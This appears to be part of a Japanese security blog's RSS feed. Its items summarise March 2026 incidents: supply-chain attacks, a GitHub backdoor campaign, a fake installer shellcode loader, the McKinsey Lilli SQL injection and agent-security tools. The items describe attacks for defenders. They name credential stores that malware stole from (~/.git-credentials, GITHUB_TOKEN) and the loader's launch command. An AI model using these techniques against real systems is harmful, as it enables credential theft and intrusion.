+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-----END PUBLIC KEY-----
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;これは過去に修正されたはずの &lt;strong&gt;CVE-2023-48223&lt;/strong&gt;（アルゴリズム混同攻撃）と同様の攻撃を再び可能にする。前回の修正が不完全だったことが根本原因だ。&lt;/p&gt;</description></item><item><title>ChatGPTのコード実行環境にDNSトンネリングによるデータ漏洩の脆弱性が発覚</title><link>https://hdknr.github.io/blogs/posts/2026/03/chatgpt-dns-tunneling-data-leak/</link><pubDate>Tue, 31 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/chatgpt-dns-tunneling-data-leak/</guid><description>ChatGPTのData Analysis環境にDNSトンネリングによるデータ漏洩の脆弱性をCheck Pointが発見。攻撃の仕組み、漏洩リスク、OpenAIの対応、ユーザーの対策を解説。</description></item><item><title>Claude Code のソースコードが npm のソースマップから全公開された件</title><link>https://hdknr.github.io/blogs/posts/2026/03/claude-code-source-map-leak/</link><pubDate>Tue, 31 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/claude-code-source-map-leak/</guid><description>Anthropic の Claude Code npm パッケージにソースマップファイルが混入し、約51万行の TypeScript ソースコードが全公開。原因の設定ミスと、npm パッケージ公開時のソースマップ対策を解説。</description></item><item><title>Pay2Key の Linux ランサムウェアが x64/ARM64 サーバーを標的に — 防御機構を無効化する高度な手口</title><link>https://hdknr.github.io/blogs/posts/2026/03/pay2key-linux-ransomware/</link><pubDate>Mon, 30 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/pay2key-linux-ransomware/</guid><description>イラン系攻撃グループ Pay2Key の Linux ランサムウェア新亜種 Pay2Key.I2P の技術分析。SELinux/AppArmor 無効化、ChaCha20 暗号化、I2P 匿名通信の手口と対策を解説。</description></item><item><title>PyPI公式パッケージ telnyx がサプライチェーン攻撃で汚染 — TeamPCPによるWAVステガノグラフィ攻撃の全容</title><link>https://hdknr.github.io/blogs/posts/2026/03/telnyx-pypi-supply-chain-attack/</link><pubDate>Fri, 27 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/telnyx-pypi-supply-chain-attack/</guid><description>PyPI公式パッケージ telnyx がTeamPCPのサプライチェーン攻撃で汚染。WAVステガノグラフィ手法の詳細と、Python開発者が今すぐ取るべき対策を解説。</description></item><item><title>ForceMemo: GitHub アカウントを乗っ取り Python リポジトリにバックドアを仕込む新型攻撃</title><link>https://hdknr.github.io/blogs/posts/2026/03/forcememo-github-attack/</link><pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/forcememo-github-attack/</guid><description>&lt;p&gt;2026年3月上旬から、GitHub アカウントを侵害して Python リポジトリに悪意あるコードを注入する「ForceMemo」と呼ばれる大規模攻撃キャンペーンが確認されています。force-push によるコミット履歴の書き換えと、Solana ブロックチェーンを利用した C2（Command and Control: 攻撃者がマルウェアに指令を送る仕組み）通信という巧妙な手法が特徴です。&lt;/p&gt;
+&lt;h2 id="攻撃の概要"&gt;攻撃の概要&lt;/h2&gt;
+&lt;p&gt;ForceMemo は、以下の流れで Python プロジェクトを侵害します:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;GitHub アカウントの侵害&lt;/strong&gt; — GlassWorm と呼ばれる情報窃取マルウェアが VS Code / Cursor 拡張機能から GitHub トークンを抽出&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;コードの改ざん&lt;/strong&gt; — 侵害したアカウントで &lt;code&gt;setup.py&lt;/code&gt;、&lt;code&gt;main.py&lt;/code&gt;、&lt;code&gt;app.py&lt;/code&gt;、&lt;code&gt;manage.py&lt;/code&gt; 等に難読化されたマルウェアを注入&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;痕跡の隠蔽&lt;/strong&gt; — force-push でコミット履歴を書き換え、タイムスタンプを維持することで改ざんを検知困難に&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;C2 通信&lt;/strong&gt; — Solana ブロックチェーンのメモ機能を使ったコマンド＆コントロール通信&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id="glassworm-による初期侵入"&gt;GlassWorm による初期侵入&lt;/h2&gt;
+&lt;p&gt;攻撃の起点となる GlassWorm は情報窃取型マルウェアで、VS Code および Cursor の拡張機能を経由して感染します。窃取対象となる GitHub トークンの格納先は多岐にわたります:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;VS Code / Cursor 拡張機能のストレージ&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;git credential fill&lt;/code&gt; の出力&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;~/.git-credentials&lt;/code&gt; ファイル&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;GITHUB_TOKEN&lt;/code&gt; 環境変数&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;窃取されたトークンを使って正規のアカウントとしてリポジトリにアクセスし、コードを改ざんします。&lt;/p&gt;
+&lt;h2 id="force-push-による履歴改ざん"&gt;force-push による履歴改ざん&lt;/h2&gt;
+&lt;p&gt;通常のコミットであれば &lt;code&gt;git log&lt;/code&gt; で変更履歴を追跡できますが、ForceMemo は force-push を使ってコミット履歴自体を書き換えます。さらにタイムスタンプも維持するため、リポジトリのメンテナーやユーザーが改ざんに気づきにくい構造になっています。&lt;/p&gt;</description></item><item><title>CVE-2026-32746: GNU Inetutils telnetd に32年間潜んでいた認証前リモートコード実行の脆弱性</title><link>https://hdknr.github.io/blogs/posts/2026/03/cve-2026-32746-telnetd/</link><pubDate>Wed, 18 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/cve-2026-32746-telnetd/</guid><description>GNU Inetutils telnetd の認証前リモートコード実行脆弱性 CVE-2026-32746（CVSS 9.8）の技術的詳細、攻撃手法、パッチ状況、対策を解説。</description></item><item><title>Palo Alto Cortex XDR の振る舞い検知ルールが解読・バイパスされた脆弱性の全容</title><link>https://hdknr.github.io/blogs/posts/2026/03/cortex-xdr-bioc-bypass/</link><pubDate>Wed, 18 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/cortex-xdr-bioc-bypass/</guid><description>Cortex XDR エージェントの BIOC ルールが AES 暗号化キーのハードコードにより解読可能だった脆弱性の技術解説。ccmcache 許可リストによる検知バイパスの手口と修正内容を詳述。</description></item><item><title>1Password Unified Access：AIエージェント時代のシークレット管理が本格始動</title><link>https://hdknr.github.io/blogs/posts/2026/03/1password-unified-access-ai-agent/</link><pubDate>Tue, 17 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/1password-unified-access-ai-agent/</guid><description>&lt;p&gt;Claude Code や Cursor で開発していると、&lt;code&gt;.env&lt;/code&gt; に書いた API キーを AI が普通にファイルシステムから読みに行く。&lt;code&gt;.gitignore&lt;/code&gt; していても関係ない。この課題に対して、1Password が Anthropic・Cursor・GitHub・Vercel・Perplexity と連携し「AI エージェント時代のシークレット管理」を本気で構築し始めた。&lt;/p&gt;
+&lt;h2 id="何が発表されたのか"&gt;何が発表されたのか&lt;/h2&gt;
+&lt;p&gt;2026年3月17日、1Password は &lt;strong&gt;1Password Unified Access&lt;/strong&gt; を発表した。人間・マシン・AI エージェントにまたがるアクセスを一元的に発見・保護・監査するためのプラットフォームだ。&lt;/p&gt;
+&lt;p&gt;従来のパスワードマネージャーの枠を超え、AI エージェントが本番環境で実際に動作する時代に合わせたクレデンシャル管理を提供する。&lt;/p&gt;
+&lt;h2 id="なぜ必要なのかenv-問題"&gt;なぜ必要なのか：.env 問題&lt;/h2&gt;
+&lt;p&gt;AI コーディングツール（Claude Code、Cursor など）は、タスク遂行のためにローカルファイルシステム上のファイルを読む。&lt;code&gt;.env&lt;/code&gt; ファイルに平文で保存された API キーやトークンは、AI エージェントから直接アクセスできてしまう。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;.gitignore&lt;/code&gt; はリポジトリへのコミットを防ぐだけで、ローカルファイルシステム上での読み取りは防げない。つまり、現状の &lt;code&gt;.env&lt;/code&gt; ベースのシークレット管理は AI エージェント時代には不十分だ。&lt;/p&gt;
+&lt;h2 id="各社との連携内容"&gt;各社との連携内容&lt;/h2&gt;
+&lt;h3 id="anthropicclaude-code--cowork--ブラウザ拡張"&gt;Anthropic（Claude Code / Cowork / ブラウザ拡張）&lt;/h3&gt;
+&lt;p&gt;Anthropic は 1Password を統合し、Claude Code、Cowork、Claude ブラウザ拡張からボールト内のアイテムを安全にオートフィルできるようにする。ユーザーの同意のもと、Claude がサイトやサービスに 1Password から直接クレデンシャルを取得してログインできる仕組みだ。&lt;/p&gt;
+&lt;h3 id="cursorhooks-による-just-in-time-シークレット"&gt;Cursor（Hooks による just-in-time シークレット）&lt;/h3&gt;
+&lt;p&gt;Cursor との連携では、&lt;strong&gt;Cursor Hooks&lt;/strong&gt; を活用した just-in-time なシークレット提供を実現する。&lt;/p&gt;
+&lt;p&gt;仕組みは以下の通り:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;プロジェクトに &lt;code&gt;hooks.json&lt;/code&gt; を設定&lt;/li&gt;
+&lt;li&gt;Cursor がシェルコマンドを実行する前に、1Password Environments Hook Script が起動&lt;/li&gt;
+&lt;li&gt;プロセスがアクセスを要求すると、1Password がユーザーに認証を求める&lt;/li&gt;
+&lt;li&gt;承認されると、必要なシークレットがランタイムセッションのメモリ上にのみ提供される&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;これにより、平文キーがディスクやソースコードにコミットされることがなく、環境変数のハードコードやトークンの履歴残留も防げる。&lt;/p&gt;</description></item><item><title>Microsoft Agent Governance Toolkit：AIエージェントのセキュリティを4つの柱で守るOSSツールキット</title><link>https://hdknr.github.io/blogs/posts/2026/03/agent-governance-toolkit/</link><pubDate>Sat, 14 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/agent-governance-toolkit/</guid><description>&lt;p&gt;Microsoft がオープンソースで公開した &lt;a href="https://github.com/microsoft/agent-governance-toolkit"&gt;Agent Governance Toolkit&lt;/a&gt; は、自律型 AI エージェントに欠けていたセキュリティレイヤーを提供するツールキットだ。ポリシー強制、ゼロトラスト ID、実行サンドボックス、信頼性エンジニアリングの4つの柱で、OWASP Agentic Top 10 の全10項目のリスクをカバーする。&lt;/p&gt;
+&lt;h2 id="背景なぜ-ai-エージェントにガバナンスが必要か"&gt;背景：なぜ AI エージェントにガバナンスが必要か&lt;/h2&gt;
+&lt;p&gt;AI エージェントが自律的にツールを呼び出し、ファイルを操作し、外部 API と通信する時代になった。しかし、その自律性にはリスクが伴う。意図しないゴールの書き換え、過剰な権限の付与、エージェント間通信の改ざん、カスケード障害など、従来の Web アプリケーションとは異なるセキュリティ課題がある。&lt;/p&gt;
+&lt;p&gt;OWASP は「Agentic Top 10」として AI エージェント特有のリスクを定義しており、Agent Governance Toolkit はこの全10項目に対応している。&lt;/p&gt;
+&lt;h2 id="4つの柱"&gt;4つの柱&lt;/h2&gt;
+&lt;h3 id="1-policy-engineポリシーエンジン"&gt;1. Policy Engine（ポリシーエンジン）&lt;/h3&gt;
+&lt;p&gt;すべてのエージェントアクションを実行前に評価し、許可・拒否を判定する。サブミリ秒（0.1ms 未満）のレイテンシで動作するため、エージェントの応答速度に影響を与えない。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; agent_governance_toolkit &lt;span style="color:#f92672"&gt;import&lt;/span&gt; CapabilityModel
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;capabilities &lt;span style="color:#f92672"&gt;=&lt;/span&gt; CapabilityModel(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; allowed_tools&lt;span style="color:#f92672"&gt;=&lt;/span&gt;[&lt;span style="color:#e6db74"&gt;&amp;#34;web_search&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;file_read&amp;#34;&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; denied_tools&lt;span style="color:#f92672"&gt;=&lt;/span&gt;[&lt;span style="color:#e6db74"&gt;&amp;#34;file_write&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;shell_exec&amp;#34;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;許可するツールと拒否するツールを明示的に定義し、エージェントが意図しない操作を行うことを防ぐ。&lt;/p&gt;</description></item><item><title>GitHub で見つけた「便利ツール」を解析したらマルウェアだった話：偽 OpenClaw インストーラーの実態</title><link>https://hdknr.github.io/blogs/posts/2026/03/github-malware-openclaw-installer/</link><pubDate>Wed, 11 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/github-malware-openclaw-installer/</guid><description>&lt;p&gt;GitHub 上で OpenClaw の便利ツールを装った不審なリポジトリが発見され、実際に解析したところマルウェア（シェルコードローダー）であることが判明した。ひよっこサウナ氏（&lt;a href="https://zenn.dev/hiyoko_sauna"&gt;@hiyoko_sauna&lt;/a&gt;）による詳細な解析レポートを基に、この攻撃手法の全体像を紹介する。&lt;/p&gt;
+&lt;h2 id="対象リポジトリの特徴"&gt;対象リポジトリの特徴&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;github.com/sdwadsagw/OpenClawInstaller&lt;/code&gt; という、「Open Claw を簡単にインストールできるツール」として公開されていたリポジトリが対象だ。&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;項目&lt;/th&gt;
+&lt;th&gt;値&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;アカウント作成日&lt;/td&gt;
+&lt;td&gt;2026-02-11（リポジトリと同日作成）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Star / Fork&lt;/td&gt;
+&lt;td&gt;2 / 0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;説明文&lt;/td&gt;
+&lt;td&gt;「AI assistant for Open Claw」&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;使い捨てアカウント（リポジトリと同日作成）という時点で怪しさ満点だ。&lt;/p&gt;
+&lt;h2 id="zip-の中身"&gt;ZIP の中身&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;Claw-Installer-Open-2.8-alpha.3.zip&lt;/code&gt; を展開すると 4 ファイルが入っていた。&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;ファイル&lt;/th&gt;
+&lt;th&gt;サイズ&lt;/th&gt;
+&lt;th&gt;VT 検出率&lt;/th&gt;
+&lt;th&gt;説明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;StartApp.bat&lt;/td&gt;
+&lt;td&gt;22 bytes&lt;/td&gt;
+&lt;td&gt;-&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;start luau.exe asm.txt&lt;/code&gt; を実行するだけ&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;luau.exe&lt;/td&gt;
+&lt;td&gt;288,768 bytes&lt;/td&gt;
+&lt;td&gt;25/76&lt;/td&gt;
+&lt;td&gt;LuaJIT 2.1.0-beta3（正規バイナリ）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;lua51.dll&lt;/td&gt;
+&lt;td&gt;390,144 bytes&lt;/td&gt;
+&lt;td&gt;1/75&lt;/td&gt;
+&lt;td&gt;LuaJIT 用ランタイム DLL&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;asm.txt&lt;/td&gt;
+&lt;td&gt;309,298 bytes&lt;/td&gt;
+&lt;td&gt;0/76&lt;/td&gt;
+&lt;td&gt;難読化された Lua スクリプト&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;注目すべきは &lt;strong&gt;asm.txt の検出率が 0/76&lt;/strong&gt; という点だ。悪意のあるコードは asm.txt に書かれているのに検出されず、無害な luau.exe の方が検出されるという逆転現象が起きている。&lt;/p&gt;</description></item><item><title>Kali Linux × Ollama × MCP — 完全ローカルで動く AI ペンテスト環境の構築</title><link>https://hdknr.github.io/blogs/posts/2026/03/kali-ollama-mcp-pentesting/</link><pubDate>Wed, 11 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/kali-ollama-mcp-pentesting/</guid><description>&lt;p&gt;Kali Linux チームが、外部 SaaS に一切依存しない&lt;strong&gt;完全ローカルの AI ペンテスト支援環境&lt;/strong&gt;の構築ガイドを&lt;a href="https://www.kali.org/blog/kali-llm-ollama-5ire/"&gt;公式ブログ&lt;/a&gt;で公開した。Ollama でローカル LLM を動かし、MCP（Model Context Protocol）経由で nmap などの Kali ツールを自然言語から操作する構成だ。&lt;/p&gt;
+&lt;h2 id="構成要素"&gt;構成要素&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;コンポーネント&lt;/th&gt;
+&lt;th&gt;役割&lt;/th&gt;
+&lt;th&gt;アーキテクチャ上の位置づけ&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Ollama&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;ローカル LLM サーバー。llama.cpp のラッパーとしてモデルのダウンロード・サービングを簡素化&lt;/td&gt;
+&lt;td&gt;推論エンジン（脳）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;mcp-kali-server&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Flask ベースの MCP サーバー（127.0.0.1:5000）。nmap, gobuster, nikto, hydra, sqlmap 等の Kali ツールを MCP 経由で公開&lt;/td&gt;
+&lt;td&gt;ツールサーバー（手足）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;5ire&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;デスクトップ AI アシスタント兼 MCP クライアント。ユーザー入力を LLM に送り、LLM の応答からツール呼び出しを検出し、MCP 経由でツールを実行し、結果を LLM に戻すループを回す&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;AI エージェント&lt;/strong&gt;（オーケストレーター）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;この構成で「エージェント」に相当するのは &lt;strong&gt;5ire&lt;/strong&gt; だ。LLM（Ollama）は推論を担うだけであり、ツールサーバー（mcp-kali-server）は呼ばれるのを待つだけ。ユーザーの意図を解釈し、LLM とツールの間を仲介して自律的にループを回す 5ire こそがエージェントの役割を果たしている。Claude Code に例えると、Ollama は API の向こう側の Claude モデル、mcp-kali-server は MCP サーバー、5ire は Claude Code 本体に相当する。&lt;/p&gt;</description></item><item><title>マッキンゼーの社内AI「Lilli」がSQLインジェクションで完全突破された件</title><link>https://hdknr.github.io/blogs/posts/2026/03/mckinsey-lilli-sql-injection/</link><pubDate>Wed, 11 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/mckinsey-lilli-sql-injection/</guid><description>&lt;p&gt;セキュリティスタートアップ CodeWall の AI エージェントが、マッキンゼーの社内 AI プラットフォーム「Lilli」をわずか2時間で完全突破した。4,650万件のチャット履歴からシステムプロンプトまで、認証なしで読み書き可能だったという。攻撃手法は SQL インジェクション——教科書の1章目に載る古典的な脆弱性だ。&lt;/p&gt;
+&lt;h2 id="lilli-とは"&gt;Lilli とは&lt;/h2&gt;
+&lt;p&gt;Lilli はマッキンゼーが社内向けに構築した生成 AI プラットフォームで、数万人のコンサルタントが日常的に利用している。戦略立案、M&amp;amp;A 分析、クライアント対応など、機密性の高い業務に活用されていた。&lt;/p&gt;
+&lt;h2 id="lilli-のアーキテクチャ"&gt;Lilli のアーキテクチャ&lt;/h2&gt;
+&lt;p&gt;マッキンゼーは Lilli の技術構成をある程度公開しており、その設計思想と今回の事件のギャップが際立つ。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;RAG パイプライン + オーケストレーション層&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Lilli のコアは RAG（Retrieval-Augmented Generation）パイプラインだ。40以上のキュレーション済みナレッジソースに10万件超のドキュメント、インタビュー記録、セクター別プレイブックが格納されている。ユーザーのクエリはベクトル埋め込みでマッチングされ、5〜7件の関連文書が引用付きで提示される。四半期あたり約200万クエリを処理する規模だ。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;技術スタック&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;LLM&lt;/strong&gt;: Cohere、OpenAI（Azure 経由）など複数モデルを併用。Microsoft、Google、Nvidia、Anthropic との戦略的パートナーシップ&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;フレームワーク&lt;/strong&gt;: QuantumBlack の Horizon ツールキット、LangChain、FAISS&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;インフラ&lt;/strong&gt;: Microsoft Azure（データストレージ・スケーラビリティ）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;独自ツール&lt;/strong&gt;: PowerPoint を85%以上読み取り可能にする独自ドキュメントパーサー&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;「ゼロトラスト」設計——のはずだった&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;マッキンゼーは Lilli のセキュリティについて、ゼロトラストセキュリティスタック、オンプレミスデータストア、ロールベースアクセス制御（RBAC）、完全な監査ログを備えていると説明していた。しかし実際には、22個の API エンドポイントが認証なしで外部に公開されていた。設計上のセキュリティと実装上のセキュリティの乖離が、今回の事件の根本原因だ。&lt;/p&gt;
+&lt;h2 id="攻撃の経緯"&gt;攻撃の経緯&lt;/h2&gt;
+&lt;p&gt;CodeWall の自律型セキュリティエージェントは、以下の手順で Lilli を攻撃した:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;公開 API ドキュメントの発見&lt;/strong&gt; — Lilli の API ドキュメントが外部から閲覧可能な状態だった&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;認証不要エンドポイントの特定&lt;/strong&gt; — 22個のエンドポイントが認証なしでアクセス可能だった&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SQL インジェクションの検出&lt;/strong&gt; — ユーザー検索クエリを書き込むエンドポイントで、JSON のキー名が SQL 文に直接連結されていた&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;本番データベースへのフルアクセス&lt;/strong&gt; — 読み取りと書き込みの両方が可能な状態に到達&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;人間の介入は一切なし。AI エージェントが自律的に脆弱性を発見し、エクスプロイトまで完了した。&lt;/p&gt;</description></item><item><title>脆弱性管理の次の時代 ── Exposure Management とは何か</title><link>https://hdknr.github.io/blogs/posts/2026/03/exposure-management/</link><pubDate>Wed, 11 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/exposure-management/</guid><description>&lt;p&gt;企業のセキュリティチームは深刻な課題に直面しています。NVD（National Vulnerability Database）に登録される CVE は年間 25,000 件以上。多くの企業では数万〜数十万の脆弱性がスキャンで検出されます。しかし現実は明確で、「すべてを修正することは不可能」です。&lt;/p&gt;
+&lt;p&gt;この状況を背景に、ガートナーは新しいセキュリティの考え方として &lt;strong&gt;Exposure Management（エクスポージャー管理）&lt;/strong&gt; を提示しました。&lt;/p&gt;
+&lt;h2 id="cvss-とは何か"&gt;CVSS とは何か&lt;/h2&gt;
+&lt;p&gt;Exposure Management を理解する前に、従来の脆弱性管理の中核にある &lt;strong&gt;CVSS（Common Vulnerability Scoring System）&lt;/strong&gt; について押さえておきましょう。&lt;/p&gt;
+&lt;p&gt;CVSS は、脆弱性の深刻度を &lt;strong&gt;0.0〜10.0&lt;/strong&gt; のスコアで数値化する国際的な評価基準です。FIRST（Forum of Incident Response and Security Teams）が管理しており、現在は v3.1 と v4.0 が使われています。&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;スコア&lt;/th&gt;
+&lt;th&gt;深刻度&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;9.0〜10.0&lt;/td&gt;
+&lt;td&gt;Critical（緊急）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;7.0〜8.9&lt;/td&gt;
+&lt;td&gt;High（重要）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;4.0〜6.9&lt;/td&gt;
+&lt;td&gt;Medium（警告）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0.1〜3.9&lt;/td&gt;
+&lt;td&gt;Low（注意）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;スコアは以下の観点から算出されます。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;攻撃元区分&lt;/strong&gt; — ネットワーク経由か、物理アクセスが必要か&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;攻撃条件の複雑さ&lt;/strong&gt; — 特殊な条件が必要か&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;必要な特権レベル&lt;/strong&gt; — 認証が必要か&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ユーザ関与&lt;/strong&gt; — ユーザの操作（リンクのクリック等）が必要か&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;影響範囲&lt;/strong&gt; — 機密性・完全性・可用性への影響度&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;CVSS は脆弱性の&lt;strong&gt;技術的な深刻度&lt;/strong&gt;を標準化された方法で伝える点で非常に有用です。しかし、このスコアだけに頼る運用には限界があります。&lt;/p&gt;
+&lt;h2 id="従来の脆弱性管理の限界"&gt;従来の脆弱性管理の限界&lt;/h2&gt;
